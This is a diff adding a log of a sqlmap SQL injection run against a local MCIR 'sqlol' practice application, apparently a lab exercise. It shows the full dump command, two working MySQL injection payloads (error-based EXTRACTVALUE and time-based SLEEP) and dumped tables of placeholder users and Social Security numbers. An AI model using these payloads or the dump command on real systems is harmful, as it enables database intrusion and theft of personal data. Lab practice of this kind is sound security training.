@@ -1,0 +1,48 @@
+=================================================================================
+sqlmap -u 
+"http://localhost/MCIR/sqlol/select.php?sanitization_level=none&sanitization_type=keyword&sanitization_params=&query_results=none&error_level=verbose&inject_string=test&location=where_string&submit=Inject%21" -p inject_string --dump --risk=1 --level=1
+
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for MySQL extending provided level (1) and risk (1) values? [Y/n] n
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
+GET parameter 'inject_string' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 67 HTTP(s) requests:
+---
+Parameter: inject_string (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: sanitization_level=none&sanitization_type=keyword&sanitization_params=&query_results=none&error_level=verbose&inject_string=test' AND EXTRACTVALUE(6152,CONCAT(0x5c,0x7178787871,(SELECT (ELT(6152=6152,1))),0x7170786271)) AND 'KoSl'='KoSl&location=where_string&submit=Inject!
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: sanitization_level=none&sanitization_type=keyword&sanitization_params=&query_results=none&error_level=verbose&inject_string=test' AND (SELECT 9520 FROM (SELECT(SLEEP(5)))XPGe) AND 'pmtU'='pmtU&location=where_string&submit=Inject!
+---
+web application technology: Apache 2.4.38, PHP 5.6.40
+back-end DBMS: MySQL >= 5.1
+Database: sqlol
+Table: users
+[5 entries]
++----+---------+-----------------------+
+| id | isadmin | username              |
++----+---------+-----------------------+
+| 1  | 1       | Herp Derper           |
+| 2  | 1       | SlapdeBack LovedeFace |
+| 3  | 0       | Wengdack Slobdegoob   |
+| 4  | 0       | Chunk MacRunfast      |
+| 5  | 0       | Peter Weiner          |
++----+---------+-----------------------+
+
+Database: sqlol
+Table: ssn
+[5 entries]
++-------------+-----------------------+
+| ssn         | name                  |
++-------------+-----------------------+
+| 000-00-1112 | Wengdack Slobdegoob   |
+| 012-34-5678 | Herp Derper           |
+| 111-22-3333 | Peter Weiner          |
+| 666-67-6776 | Chunk MacRunfast      |
+| 999-99-9999 | SlapdeBack LovedeFace |
++-------------+-----------------------+
+
